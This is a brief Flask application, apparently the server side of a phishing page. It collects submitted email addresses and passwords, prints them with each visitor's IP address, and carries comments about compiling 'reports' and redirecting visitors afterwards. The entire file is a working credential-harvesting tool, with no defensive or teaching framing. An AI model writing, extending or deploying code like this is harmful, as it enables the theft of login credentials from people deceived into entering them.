from flask import Flask, request, render_template


app = Flask(__name__)


@app.route('/', methods=['GET', 'POST'])
def hello_world():
    if request.method == 'POST':

        email = request.form['email']
        passwd = request.form['password']
        
        # TODO: request.user_agent and more data to add in reports.

        print('Email: {}'.format(email))
        print('Password: {}'.format(passwd))
        print(request.remote_addr)

        # redirect a donde toque
    return render_template('index.html', name='index')

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0')
    # app.run(host='0.0.0.0', port='80')
